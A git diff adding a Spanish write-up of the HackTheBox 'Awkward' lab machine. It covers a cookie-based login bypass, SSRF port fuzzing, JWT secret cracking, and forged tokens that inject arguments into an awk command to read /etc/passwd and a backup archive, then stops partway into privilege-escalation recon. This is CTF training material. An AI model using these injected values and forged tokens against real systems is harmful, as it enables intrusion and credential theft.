@@ -3,8 +3,903 @@ layout: post
 title: "Máquina Awkward"
 description: "Resolución de la máquina Awkward de HackTheBox."
 tags: ['Medium', 'Vue', 'Login Bypass', 'Hash cracking', 'SSRF', 
-'JWT Cracking', 'LFI', 'Command Injection', 'Cron job']
+'JWT Cracking', 'LFI', 'inotifywait']
 type: writeup
 machine_name: Awkward
 platform: HackTheBox
 ---
+
+En esta máquina Linux encontraremos un sitio con sus assets de Vue mal procesadas, por lo que podremos ir viendo el código de la página. Luego bypassearemos el login y encontraremos una vulnerablidad SSRF en la página con la cual podremos acceder a la documentación interna de una API vulnerable a LFI. Ultimamente escalaremos privilegios aprovechandonos de un script que espera cambios en un fichero.
+
+<h2>RECONOCIMIENTO</h2>
+
+La máquina solo tiene dos puertos abiertos:
+
+{% highlight bash %}
+# Nmap 7.93 scan initiated Wed Feb 22 14:51:09 2023 as: nmap -sS -Pn -n -vvv -p- --open --min-rate 100 -oN ports 10.10.11.185
+Nmap scan report for 10.10.11.185
+Host is up, received user-set (0.36s latency).
+Scanned at 2023-02-22 14:51:09 -04 for 123s
+Not shown: 65109 closed tcp ports (reset), 424 filtered tcp ports (no-response)
+Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+PORT   STATE SERVICE REASON
+22/tcp open  ssh     syn-ack ttl 63
+80/tcp open  http    syn-ack ttl 63
+
+Read data files from: /usr/bin/../share/nmap
+# Nmap done at Wed Feb 22 14:53:12 2023 -- 1 IP address (1 host up) scanned in 123.06 seconds
+{% endhighlight %}
+
+Si vamos al sitio web de la maquina nos mandará a el dominio hat-valley.htb. Agregemoslo a nuestro archivo de hosts:
+
+{% highlight bash %}
+# /etc/hosts
+
+10.10.11.185 hat-valley.htb
+{% endhighlight %}
+
+El sitio web que encontramos es... un portal para una tienda de sombreros
+
+![Website](/assets/writeups/awkward/1.png)
+
+Si bajamos veremos que hay una parte donde se muestra al equipo de administración de Hat Valley, con esto podemos pensar en posibles nombres de usuario
+
+![Team](/assets/writeups/awkward/2.png)
+
+También veremos una plantilla de contacto pero no parece hacer algo.
+
+<h2>INTRUSIÓN</h2>
+
+Buscando por subdominios encontramos un store.hat-valley.htb, pero nos pide autenticación:
+
+{% highlight bash %}
+# ffuf -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.hat-valley.htb" -fs 132 -u http://10.10.11.185
+
+store                   [Status: 401, Size: 188, Words: 6, Lines: 8, Duration: 171ms]
+{% endhighlight %}
+
+Lo agregaremos a nuestro archivo de hosts también para luego ver que hay ahí.
+
+Por rutas encontramos otras cositas:
+
+{% highlight bash %}
+# wfuzz -c -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 200 --hw=163 http://hat-valley.htb/FUZZ
+
+000000257:   301        10 L     16 W       179 Ch      "static"                                                                              
+000000538:   301        10 L     16 W       173 Ch      "css"                                                                                 
+000000941:   301        10 L     16 W       171 Ch      "js"                                                                                  
+000001014:   404        10 L     15 W       142 Ch      "api"   
+{% endhighlight %}
+
+El sitio se ve que tiene una API.
+
+Pero viendo el código de la página, miramos que parece usar un framework de JavaScript para representar el contenido (frontend):
+
+![JavaScript](/assets/writeups/awkward/3.png)
+
+Este archivo fue traspilado con Webpack y Babel pero de una forma extraña; cada comentario y código es una chunk de código traspilado, y viendo una que otra parte de código vemos cosas que nos hacen creer que el sitio fue hecho en el Framework Vue.
+
+![Code](/assets/writeups/awkward/4.png)
+
+El comentario nos dice como se llamaba el archivo de la chunk y el código sería el contenido pre-traspilado en formato algo ilegible. Al final de cada chunk hay una cadena base64 pero para analizar todo mejor vamos a bajarnos el archivo a nuestro equipo
+
+{% highlight bash %}
+❯ curl -o app.js http://hat-valley.htb/js/app.js
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100  420k  100  420k    0     0   370k      0  0:00:01  0:00:01 --:--:--  370k
+{% endhighlight %}
+
+Si decodificamos las cadenas base64, encontramos que es un objeto JSON de Webpack con parte del código original de la chunk un poco más legible:
+
+{% highlight bash %}
+❯ base64 -d a | cat -l js
+
+{"version":3,"file":"./src/App.vue.js","sources":["webpack:///./src/App.vue?ae2f"],"sourcesContent":["import { render } from \"./App.vue?vue&type=template&id=7ba5bd90\"\nimport script from \"./App.vue?vue&type=script&lang=js\"\nexport * from \"./App.vue?vue&type=script&lang=js\"\n\nimport exportComponent from \"/var/www/hat-valley.htb/node_modules/@vue/cli-service/node_modules/vue-loader-v16/dist/exportHelper.js\"\nconst __exports__ = /*#__PURE__*/exportComponent(script, [['render',render],['__file',\"src/App.vue\"]])\n/* hot reload */\nif (module.hot) {\n  __exports__.__hmrId = \"7ba5bd90\"\n  const api = __VUE_HMR_RUNTIME__\n  module.hot.accept()\n  if (!api.createRecord('7ba5bd90', __exports__)) {\n console.log('reload')\n    api.reload('7ba5bd90', __exports__)\n  }\n  \n  module.hot.accept(\"./App.vue?vue&type=template&id=7ba5bd90\",() => {\n    console.log('re-render')\n    api.rerender('7ba5bd90', render)\n  })\n\n}\n\n\nexport default __exports__"],"mappings":"AAAA;AAAA;AAAA;AAAA;AAAA;AAAA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AAAA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA","sourceRoot":""}
+{% endhighlight %}
+
+Usando perl para procesar el texto, podemos verlo aún más legible
+
+{% highlight javascript %}
+#base64 -d a | perl -pe 's/\\n/\n/g' | cat -l js
+
+{"version":3,"file":"./src/App.vue.js","sources":["webpack:///./src/App.vue?ae2f"],"sourcesContent":["import { render } from \"./App.vue?vue&type=template&id=7ba5bd90\"
+import script from \"./App.vue?vue&type=script&lang=js\"
+export * from \"./App.vue?vue&type=script&lang=js\"
+
+import exportComponent from \"/var/www/hat-valley.htb/node_modules/@vue/cli-service/node_modules/vue-loader-v16/dist/exportHelper.js\"
+const __exports__ = /*#__PURE__*/exportComponent(script, [['render',render],['__file',\"src/App.vue\"]])
+/* hot reload */
+if (module.hot) {
+  __exports__.__hmrId = \"7ba5bd90\"
+  const api = __VUE_HMR_RUNTIME__
+  module.hot.accept()
+  if (!api.createRecord('7ba5bd90', __exports__)) {
+    console.log('reload')
+    api.reload('7ba5bd90', __exports__)
+  }
+  
+  module.hot.accept(\"./App.vue?vue&type=template&id=7ba5bd90\", () => {
+    console.log('re-render')
+    api.rerender('7ba5bd90', render)
+  })
+
+}
+
+
+export default __exports__"],"mappings":"AAAA;AAAA;AAAA;AAAA;AAAA;AAAA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AAAA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA","sourceRoot":""}
+
+{% endhighlight %}
+
+Ya podemos ver algo del código de la página, y al ser todo json podemos extraerlo fácilmente con jq
+
+`base64 -d a | perl -pe 's/\\n/\n/g' | jq`
+
+Continuando con el archivo app.js encontramos chunks interesantes:
+
+![Chunk1](/assets/writeups/awkward/5.png)
+
+![Chunk2](/assets/writeups/awkward/6.png)
+
+Si probamos a ver si existe una ruta con nombres de estas chunks, encontramos un panel de autenticación:
+
+![Login](/assets/writeups/awkward/7.png)
+
+Parece que la ruta del panel es dashboard, y justo hay varias chunks traspiladas del archivo Dashboard.vue como vimos arriba... échandoles un vistazo no parece tener otra cosa más que el código de la página de dashboard
+
+{% highlight javascript %}
+import { render } from \"./Dashboard.vue?vue&type=template&id=4bc724eb&scoped=true\"
+import script from \"./Dashboard.vue?vue&type=script&lang=js\"
+export * from \"./Dashboard.vue?vue&type=script&lang=js\"
+
+import \"./Dashboard.vue?vue&type=style&index=0&id=4bc724eb&scoped=true&lang=css\"
+
+import exportComponent from \"/var/www/hat-valley.htb/node_modules/@vue/cli-service/node_modules/vue-loader-v16/dist/exportHelper.js\"
+const __exports__ = /*#__PURE__*/exportComponent(script, [['render',render],['__scopeId',\"data-v-4bc724eb\"],['__file',\"src/Dashboard.vue\"]])
+/* hot reload */
+if (module.hot) {
+  __exports__.__hmrId = \"4bc724eb\"
+  const api = __VUE_HMR_RUNTIME__
+  module.hot.accept()
+  if (!api.createRecord('4bc724eb', __exports__)) {
+    console.log('reload')
+    api.reload('4bc724eb', __exports__)
+  }
+  
+  module.hot.accept(\"./Dashboard.vue?vue&type=template&id=4bc724eb&scoped=true\", () => {
+    console.log('re-render')
+    api.rerender('4bc724eb', render)
+  })
+
+}
+
+
+export default __exports__
+{% endhighlight %}
+
+HR.vue es más de lo mismo; nada de lo que podamos aprovecharnos, pero si seguimos buscando encontramos algo tocho:
+
+{% highlight javascript %}
+/***/ "./src/router/router.js":
+/*!******************************!*\
+  !*** ./src/router/router.js ***!
+  \******************************/
+/*! exports provided: default */
+/***/ (function(module, __webpack_exports__, __webpack_require__) {
+
+"use strict";
+eval("__webpack_require__.r(__webpack_exports__)...
+{% endhighlight%}
+
+Parece que también este archivo traspilado tiene incluido el router de la página... vamos a mirarlo
+
+{% highlight javascript %}
+import { createWebHistory, createRouter } from "vue-router";
+import { VueCookieNext } from 'vue-cookie-next'
+import Base from '../Base.vue'
+import HR from '../HR.vue'
+import Dashboard from '../Dashboard.vue'
+import Leave from '../Leave.vue'
+
+const routes = [
+  {
+    path: "/",
+    name: "base",
+    component: Base,
+  },
+  {
+    path: "/hr",
+    name: "hr",
+    component: HR,
+  },
+  {
+    path: "/dashboard",
+    name: "dashboard",
+    component: Dashboard,
+    meta: {
+      requiresAuth: true
+    }
+  },
+  {
+    path: "/leave",
+    name: "leave",
+    component: Leave,
+    meta: {
+      requiresAuth: true
+    }
+  }
+];
+
+const router = createRouter({
+  history: createWebHistory(),
+  routes,
+});
+
+router.beforeEach((to, from, next) => {
+  if((to.name == 'leave' || to.name == 'dashboard') && VueCookieNext.getCookie('token') == 'guest') { //if user not logged in, redirect to login
+    next({ name: 'hr' })
+  }
+  else if(to.name == 'hr' && VueCookieNext.getCookie('token') != 'guest') { //if user logged in, skip past login to dashboard
+    next({ name: 'dashboard' })
+  }
+  else {
+    next()
+  }
+})
+
+export default router;
+{% endhighlight %}
+
+El enrutador verifica que tengamos una sesión abierta antes de ir a las rutas leave y dashboard pero de una forma tonta; solamente nos impide entrar si tenemos nuestra cookie "token" puesta en guest
+
+Lo único que tenemos que hacer para abusar de esto es quitar o editar la cookie `token` y recargar el sitio. Haciéndolo ganamos acceso a una nueva parte de la página; el panel de control.
+
+![Dashboard](/assets/writeups/awkward/8.png)
+
+El sitio tiene una parte de peticiones de vacaciones y una parte para checkear si la tienda está online. Si interceptamos la petición que checkea el sitio web de la tienda vemos la ruta de `/api/store-status` en uso:
+
+![API](/assets/writeups/awkward/9.png)
+
+Si editamos el parametro de url a http://127.0.0.1 (en url-encode) nos da el sitio web que vimos en hat-valley.htb
+
+![SSRF](/assets/writeups/awkward/10.png)
+
+Esto es vulnerable a SSRF, asi que vamos a fuzzear puertos a ver si encontramos algo interesante:
+
+{% highlight bash %}
+#wfuzz -c -z range,0-65535 -b "token=whateveryouwant" --hw=0 -t 200 "http://hat-valley.htb/api/store-status?url=%22http:%2F%2F127.0.0.1:FUZZ%2F"
+
+000000081:   200        8 L      13 W       132 Ch      "80"                                                                                  
+000003003:   200        685 L    5834 W     77002 Ch    "3002"                                                                                
+000008081:   200        54 L     163 W      2881 Ch     "8080"  
+{% endhighlight %}
+
+Hay dos puertos internos en la maquina, vamos a ver...
+
+El 3002 es la API del sitio:
+
+![API](/assets/writeups/awkward/11.png)
+
+El 8080 es el mismo sitio web que vimos al principio.
+
+Viendo la API nos va mostrando el código de esta en cuestión, hay rutas interesantes como `staff-details` pero hay una llamada `all-leaves` que tiene una parte de código algo curiosa:
+
+{% highlight javascript %}
+  if(user_token) {
+
+    const decodedToken = jwt.verify(user_token, TOKEN_SECRET)
+
+    if(!decodedToken.username) {
+
+      authFailed = true
+
+    }
+
+    else {
+
+      user = decodedToken.username
+
+    }
+
+  }
+
+  if(authFailed) {
+
+    return res.status(401).json({Error: "Invalid Token"})
+
+  }
+
+  if(!user) {
+
+    return res.status(500).send("Invalid user")
+
+  }
+  const bad = [";","&","|",">","<","*","?","`","$","(",")","{","}","[","]","!","#"]
+
+
+  const badInUser = bad.some(char => user.includes(char));
+
+
+  if(badInUser) {
+
+    return res.status(500).send("Bad character detected.")
+
+  }
+
+
+  exec("awk '/" + user + "/' /var/www/private/leave_requests.csv", {encoding: 'binary', maxBuffer: 51200000}, (error, stdout, stderr) => {
+
+    if(stdout) {
+
+      return res.status(200).send(new Buffer(stdout, 'binary'));
+
+    }
+
+    if (error) {
+
+      return res.status(500).send("Failed to retrieve leave requests")
+
+    }
+
+    if (stderr) {
+
+      return res.status(500).send("Failed to retrieve leave requests")
+
+    }
+
+  })
+
+})
+{% endhighlight %}
+
+Toma el parametro user del JWT y lo concatena a el comando awk, este comando extrae las cadenas que tengan texto con el valor de la variable user.
+
+Es algo así:
+{% highlight bash %}
+❯ cat text
+vzon is cute
+suricata is ugly
+did you know?
+❯ awk '/vzon/' text
+vzon is cute
+{% endhighlight %}
+
+El aplicativo está filtrando carácteres que sean raros, pero al desarrollador se le olvidó colocar el backslash y las comillas... probando en awk se puede hacer esto:
+
+{% highlight bash %}
+❯ awk '//' /etc/passwd ' /' text
+root:x:0:0::/root:/bin/bash
+bin:x:1:1::/:/usr/bin/nologin
+daemon:x:2:2::/:/usr/bin/nologin
+mail:x:8:12::/var/spool/mail:/usr/bin/nologin
+ftp:x:14:11::/srv/ftp:/usr/bin/nologin
+http:x:33:33::/srv/http:/usr/bin/nologin
+...
+{% endhighlight %}
+
+Para llegar a abusar de eso necesitamos un JWT y poder crackear su secret para crear otro que pueda ser validado por el servidor.
+
+Si vamos a la ruta staff-details para buscar usuarios a los que podríamos intentar obtener sus contraseñas no vamos a poder porque tenemos asignado un token que no es válido, pero si intentamos a través del SSRF, el sitio nos da la página con los usuarios y con sus contraseñas hasheadas en SHA256.
+
+{% highlight json %}
+{"request": "GET /api/store-status?url=%22http:%2F%2F127.0.0.1:3002%2Fapi%2Fstaff-details%2F HTTP/1.1"}
+
+[{"user_id":1,"username":"christine.wool","password":"6529fc6e43f9061ff4eaa806b087b13747fbe8ae0abfd396a5c4cb97c5941649","fullname":"Christine Wool","role":"Founder, CEO","phone":"0415202922"},{"user_id":2,"username":"christopher.jones","password":"e59ae67897757d1a138a46c1f501ce94321e96aa7ec4445e0e97e94f2ec6c8e1","fullname":"Christopher Jones","role":"Salesperson","phone":"0456980001"},{"user_id":3,"username":"jackson.lightheart","password":"b091bc790fe647a0d7e8fb8ed9c4c01e15c77920a42ccd0deaca431a44ea0436","fullname":"Jackson Lightheart","role":"Salesperson","phone":"0419444111"},{"user_id":4,"username":"bean.hill","password":"37513684de081222aaded9b8391d541ae885ce3b55942b9ac6978ad6f6e1811f","fullname":"Bean Hill","role":"System Administrator","phone":"0432339177"}]
+{% endhighlight %}
+
+Intentando crackear hashes, obtenemos el de Cristopher Jones:
+
+`e59ae67897757d1a138a46c1f501ce94321e96aa7ec4445e0e97e94f2ec6c8e1:chris123`
+
+Esto ya es suficiente para obtener un JWT e intentar crackear su secret. 
+
+Iniciando sesión con las credenciales que tenemos, se nos asignará un JWT; Lo vamos a copiar y usaremos jwt-tool para intentar obtener su secret
+
+`jwt-tool -C -d /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImNocmlzdG9waGVyLmpvbmVzIiwiaWF0IjoxNjc3MTAxMzYyfQ.fL8BEvmnSIxr-O_nGwR2ze4Mm08EH8w56dPSkcz1G6c`
+
+La herramienta logra obtenerlo:
+
+{% highlight bash %}
+[*] Tested 10 million passwords so far
+[*] Tested 11 million passwords so far
+[*] Tested 12 million passwords so far
+[*] Tested 13 million passwords so far
+[+] 123beany123 is the CORRECT key!
+You can tamper/fuzz the token contents (-T/-I) and sign it using:
+python3 jwt_tool.py [options here] -S hs256 -p "123beany123"
+{% endhighlight %}
+
+Podrías usar jwt-tool para editar el contenido del token pero yo usaré la página [jwt.io](https://jwt.io) para no tener que pasar por una sección interactiva de jwt-tool por cada archivo que quiera ver
+
+![JWT](/assets/writeups/awkward/12.png)
+
+Usando este JWT, la API nos devuelve el /etc/passwd:
+
+{% highlight bash %}
+❯ curl -X GET -v -b "token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Ii8nIC9ldGMvcGFzc3dkICciLCJpYXQiOjE2NzcxMDEzNjJ9.-0MDZnWUfAOxuFRVgw_8Db05yD1-V80Z81St0hHGySY" http://hat-valley.htb/api/all-leave
+Note: Unnecessary use of -X or --request, GET is already inferred.
+*   Trying 10.10.11.185:80...
+* Connected to hat-valley.htb (10.10.11.185) port 80 (#0)
+> GET /api/all-leave HTTP/1.1
+> Host: hat-valley.htb
+> User-Agent: curl/7.87.0
+> Accept: */*
+> Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Ii8nIC9ldGMvcGFzc3dkICciLCJpYXQiOjE2NzcxMDEzNjJ9.-0MDZnWUfAOxuFRVgw_8Db05yD1-V80Z81St0hHGySY
+> 
+* Mark bundle as not supporting multiuse
+< HTTP/1.1 200 OK
+< Server: nginx/1.18.0 (Ubuntu)
+< Date: Wed, 22 Feb 2023 21:52:21 GMT
+< Content-Type: application/octet-stream
+< Content-Length: 3059
+< Connection: keep-alive
+< x-powered-by: Express
+< access-control-allow-origin: *
+< etag: W/"bf3-PdFG97gBjwRp4RtnVyUN3af1LtA"
+< 
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+messagebus:x:102:105::/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:103:106:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+syslog:x:104:111::/home/syslog:/usr/sbin/nologin
+_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
+tss:x:106:112:TPM software stack,,,:/var/lib/tpm:/bin/false
+uuidd:x:107:115::/run/uuidd:/usr/sbin/nologin
+systemd-oom:x:108:116:systemd Userspace OOM Killer,,,:/run/systemd:/usr/sbin/nologin
+tcpdump:x:109:117::/nonexistent:/usr/sbin/nologin
+avahi-autoipd:x:110:119:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin
+usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
+dnsmasq:x:112:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
+kernoops:x:113:65534:Kernel Oops Tracking Daemon,,,:/:/usr/sbin/nologin
+avahi:x:114:121:Avahi mDNS daemon,,,:/run/avahi-daemon:/usr/sbin/nologin
+cups-pk-helper:x:115:122:user for cups-pk-helper service,,,:/home/cups-pk-helper:/usr/sbin/nologin
+rtkit:x:116:123:RealtimeKit,,,:/proc:/usr/sbin/nologin
+whoopsie:x:117:124::/nonexistent:/bin/false
+sssd:x:118:125:SSSD system user,,,:/var/lib/sss:/usr/sbin/nologin
+speech-dispatcher:x:119:29:Speech Dispatcher,,,:/run/speech-dispatcher:/bin/false
+nm-openvpn:x:120:126:NetworkManager OpenVPN,,,:/var/lib/openvpn/chroot:/usr/sbin/nologin
+saned:x:121:128::/var/lib/saned:/usr/sbin/nologin
+colord:x:122:129:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
+geoclue:x:123:130::/var/lib/geoclue:/usr/sbin/nologin
+pulse:x:124:131:PulseAudio daemon,,,:/run/pulse:/usr/sbin/nologin
+gnome-initial-setup:x:125:65534::/run/gnome-initial-setup/:/bin/false
+hplip:x:126:7:HPLIP system user,,,:/run/hplip:/bin/false
+gdm:x:127:133:Gnome Display Manager:/var/lib/gdm3:/bin/false
+bean:x:1001:1001:,,,:/home/bean:/bin/bash
+christine:x:1002:1002:,,,:/home/christine:/bin/bash
+postfix:x:128:136::/var/spool/postfix:/usr/sbin/nologin
+mysql:x:129:138:MySQL Server,,,:/nonexistent:/bin/false
+sshd:x:130:65534::/run/sshd:/usr/sbin/nologin
+_laurel:x:999:999::/var/log/laurel:/bin/false
+{% endhighlight %}
+
+En el archivo podemos ver que hay dos usuarios con bash de shell: bean y christine.
+
+Viendo los archivos de bean encontramos algo curioso en su .bashrc:
+
+{% highlight bash %}
+...
+# custom
+alias backup_home='/bin/bash /home/bean/Documents/backup_home.sh'
+...
+{% endhighlight %}
+
+Al tener permisos de lectura en el directorio de bean, podemos ver el script
+
+{% highlight bash %}
+#!/bin/bash
+mkdir /home/bean/Documents/backup_tmp
+cd /home/bean
+tar --exclude='.npm' --exclude='.cache' --exclude='.vscode' -czvf /home/bean/Documents/backup_tmp/bean_backup.tar.gz .
+date > /home/bean/Documents/backup_tmp/time.txt
+cd /home/bean/Documents/backup_tmp
+tar -czvf /home/bean/Documents/backup/bean_backup_final.tar.gz .
+rm -r /home/bean/Documents/backup_tmp
+{% endhighlight %}
+
+Es un script para hacer respaldos de su directorio de usuario, y podemos descargarnos el comprimido que crea:
+
+{% highlight bash %}
+❯ curl -o backup.tar.gz -b "token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Ii8nIC9ob21lL2JlYW4vRG9jdW1lbnRzL2JhY2t1cC9iZWFuX2JhY2t1cF9maW5hbC50YXIuZ3ogJyIsImlhdCI6MTY3NzEwMTM2Mn0.wQSAB6EyXMzKn3yDaLj6lZORDpkc68wmlvUvaKj1M4E" http://hat-valley.htb/api/all-leave
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100 31716  100 31716    0     0  30268      0  0:00:01  0:00:01 --:--:-- 30292
+❯ file backup.tar.gz
+backup.tar.gz: gzip compressed data, from Unix, original size modulo 2^32 167772320 gzip compressed data, reserved method, has CRC, was "", from FAT filesystem (MS-DOS, OS/2, NT), original size modulo 2^32 167772320
+{% endhighlight %}
+
+Si lo extraemos nos dará un error al leer el final del archivo, pero igual nos habrá extraido otro comprimido con el directorio personal de Bean:
+
+{% highlight bash %}
+❯ tar -xf backup.tar.gz
+
+gzip: stdin: unexpected end of file
+tar: Child returned status 1
+tar: Error is not recoverable: exiting now
+❯ ls -la bean_backup.tar.gz
+.rw-r--r-- 32k vzon 15 sep  2022 bean_backup.tar.gz
+❯ tar -xzf bean_backup.tar.gz
+❯ ls -la
+total 140
+drwxr-x--- 15 vzon vzon  4096 sep 15 07:45 .
+drwx------ 45 vzon vzon  4096 feb 22 18:10 ..
+-rw-r--r--  1 vzon vzon 31716 feb 22 18:04 backup.tar.gz
+lrwxrwxrwx  1 vzon vzon     9 sep 15 07:40 .bash_history -> /dev/null
+-rw-r--r--  1 vzon vzon   220 sep 15 07:34 .bash_logout
+-rw-r--r--  1 vzon vzon  3847 sep 15 07:45 .bashrc
+-rw-r--r--  1 vzon vzon 32344 sep 15 07:46 bean_backup.tar.gz
+drwx------ 12 vzon vzon  4096 sep 15 07:41 .config
+drwxr-xr-x  2 vzon vzon  4096 sep 15 07:35 Desktop
+drwxr-xr-x  4 vzon vzon  4096 sep 15 07:46 Documents
+drwxr-xr-x  2 vzon vzon  4096 sep 15 07:35 Downloads
+drwx------  2 vzon vzon  4096 sep 15 07:36 .gnupg
+drwx------  3 vzon vzon  4096 sep 15 07:35 .local
+drwxr-xr-x  2 vzon vzon  4096 sep 15 07:35 Music
+drwxr-xr-x  2 vzon vzon  4096 sep 15 07:35 Pictures
+-rw-r--r--  1 vzon vzon   807 sep 15 07:34 .profile
+drwxr-xr-x  2 vzon vzon  4096 sep 15 07:35 Public
+drwx------  3 vzon vzon  4096 sep 15 07:35 snap
+drwx------  2 vzon vzon  4096 sep 15 07:36 .ssh
+drwxr-xr-x  2 vzon vzon  4096 sep 15 07:35 Templates
+-rw-r--r--  1 vzon vzon    30 sep 15 07:46 time.txt
+drwxr-xr-x  2 vzon vzon  4096 sep 15 07:35 Videos
+{% endhighlight %}
+
+Buscando en el directorio .config veremos una carpeta xpad la cual tiene archivos de notas... si los vemos encontramos esto en uno:
+
+{% highlight bash %}
+❯ ls -la
+total 20
+drwx------  2 vzon vzon 4096 sep 15 07:42 .
+drwx------ 12 vzon vzon 4096 sep 15 07:41 ..
+-rw-------  1 vzon vzon  433 sep 15 07:42 content-DS1ZS1
+-rw-------  1 vzon vzon  449 sep 15 07:41 default-style
+-rw-------  1 vzon vzon  153 sep 15 07:42 info-GQ1ZS1
+❯ cat content-DS1ZS1
+TO DO:
+- Get real hat prices / stock from Christine
+- Implement more secure hashing mechanism for HR system
+- Setup better confirmation message when adding item to cart
+- Add support for item quantity > 1
+- Implement checkout system
+
+boldHR SYSTEM/bold
+bean.hill
+014mrbeanrules!#P
+
+https://www.slac.stanford.edu/slac/www/resource/how-to-use/cgi-rexx/cgi-esc.html
+
+boldMAKE SURE TO USE THIS EVERYWHERE ^^^/bold%        
+{% endhighlight %}
+
+*NOTA: xpad es un gestor de notas para Linux*
+
+Parecen ser credenciales... y sabemos que existe un usuario bean en el sistema.
+
+Probando la contraseña con el usuario bean en ssh obtenemos acceso y podremos ver la primera flag
+
+{% highlight bash %}
+❯ /usr/bin/ssh bean@hat-valley.htb
+bean@hat-valley.htb's password: 
+Permission denied, please try again.
+bean@hat-valley.htb's password: 
+Welcome to Ubuntu 22.04.1 LTS (GNU/Linux 5.15.0-52-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+0 updates can be applied immediately.
+
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+Last login: Wed Feb 22 21:35:06 2023 from 10.10.14.75
+bean@awkward:~$ ls   
+Desktop  Documents  Downloads  Music  Pictures  Public  snap  Templates  user.txt  Videos
+bean@awkward:~$ cat user.txt
+ddca3b3f7780a4468b6f6ae*********
+bean@awkward:~$ 
+{% endhighlight %}
+
+Ahora a por root.
+
+<h2>ESCALADA DE PRIVILEGIOS</h2>
+
+Mirando procesos que se ejecutan en la maquina con pspy64 vemos que hay un script activo que está ejecutando root:
+
+{% highlight bash %}
+2023/02/24 04:17:44 CMD: UID=0    PID=1009   | /bin/bash /root/scripts/notify.sh 
+2023/02/24 04:17:44 CMD: UID=0    PID=1008   | inotifywait --quiet --monitor --event modify /var/www/private/leave_requests.csv
+{% endhighlight %}
+
+Esta esperando modificaciones del archivo `leave_requests.csv` ubicado en /var/www/private, pero a este directorio solo puede acceder Christine y www-data:
+
+{% highlight bash %}
+bean@awkward:/var/www$ ls -la
+total 28
+drwxr-xr-x  7 root      root     4096 Oct  6 01:35 .
+drwxr-xr-x 15 root      root     4096 Oct  6 01:35 ..
+drwxr-xr-x  6 root      root     4096 Oct  6 01:35 hat-valley.htb
+drwxr-xr-x  2 root      root     4096 Oct  6 01:35 html
+drw-rwx---  5 root      www-data 4096 Feb 23 16:51 .pm2
+dr-xr-x---  2 christine www-data 4096 Oct  6 01:35 private
+drwxr-xr-x  9 root      root     4096 Oct  6 01:35 store
+bean@awkward:/var/www$ cd private
+-bash: cd: private: Permission denied
+{% endhighlight %}
+
+Podríamos acceder a esa carpeta si tuvieramos una forma de acceder a la máquina como www-data o christine, pero podemos ver la carpeta store que parece pertenecer al sitio en el subdominio store.
+
+Si le echamos un vistazo veremos que está escrito en PHP, por lo que si encontraramos una vulnerabilidad para ejecutar comandos podremos ganar acceso como www-data
+
+{% highlight bash %}
+bean@awkward:/var/www/store$ ls -la
+total 104
+drwxr-xr-x 9 root root  4096 Oct  6 01:35 .
+drwxr-xr-x 7 root root  4096 Oct  6 01:35 ..
+drwxrwxrwx 2 root root  4096 Oct  6 01:35 cart
+-rwxr-xr-x 1 root root  3664 Sep 15 20:09 cart_actions.php
+-rwxr-xr-x 1 root root 12140 Sep 15 20:09 cart.php
+-rwxr-xr-x 1 root root  9143 Sep 15 20:09 checkout.php
+drwxr-xr-x 2 root root  4096 Oct  6 01:35 css
+drwxr-xr-x 2 root root  4096 Oct  6 01:35 fonts
+drwxr-xr-x 6 root root  4096 Oct  6 01:35 img
+-rwxr-xr-x 1 root root 14770 Sep 15 20:09 index.php
